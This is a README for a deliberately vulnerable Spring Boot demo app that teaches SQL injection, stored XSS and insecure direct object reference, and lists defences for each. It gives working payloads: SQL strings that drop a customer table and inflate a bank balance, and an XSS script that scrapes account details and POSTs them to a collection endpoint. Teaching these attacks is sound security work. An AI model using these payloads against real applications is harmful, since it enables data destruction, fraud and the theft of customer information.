# Common Security Vulnerability Demo

The purpose of this application is to illustrate some common security vulnerabilities in web applications. Understanding how these exploits work is critical in being able to defend against them. 

## Application Setup

This application runs in two different modes: 
* Secure - proper protections and being used to mitigate the attacks
* Insecure - the application is exposed to attacks

To run it in either mode, use the spring profile field when starting the app as follows

`mvn spring-boot:run -Dspring.profiles.active=insecure`

Currently, the application illustrates the following vulnerabilities
* SQL Injection
* Stored Cross-site scripting (XSS)

## SQL Injection

To exploit this vulnerability, log in as a customer and inject SQL into the first name field as follows

`'; SQL Here; --`

For example:

`' DROP TABLE customer; --`

`' UPDATE bank_account SET balance=999999999 WHERE customer_id=1; --

Defending against this vulnerability can be done at multiple levels
* ORM
* Input validation

## Cross-site scripting

To exploit this vulnerability, log in as a customer and inject the following javascript into the first name field as follows

`<script type="text/javascript">$(document).ready(function(){var accountInfo="";$("table").children("tbody").children("tr").each(function(){$(this).children("td").each(function(){accountInfo=accountInfo+";"+$(this).text();});});$.post("http://localhost:8080/receive-hack", {accountInfo:accountInfo});});alert("hacked");</script>`

This attack will allow a malicious user to inject a script into the database that then will run on the employee level and expose customer details to an external web server controlled by the malicious user. In this case, it is simply the same app server as is running, but this would be different in a real attack.

Defending against this vulnerability can be done at multiple levels
* Validating user input 
* Encoding dynamic output on web pages

## Insecure Direct Object Reference

To exploit this vulnerability, log in as a customer and type in the following url which will allow you to access sensitive employee-only information directly.

`/sensitive`

This attack allows users to access information that they should not be authorized to access. 

Defending against this vulnerability can be done through multiple authorization mechanisms
* URL-level protection
* Method-level security with role-based access configuration
* Method pre-authorization configuration

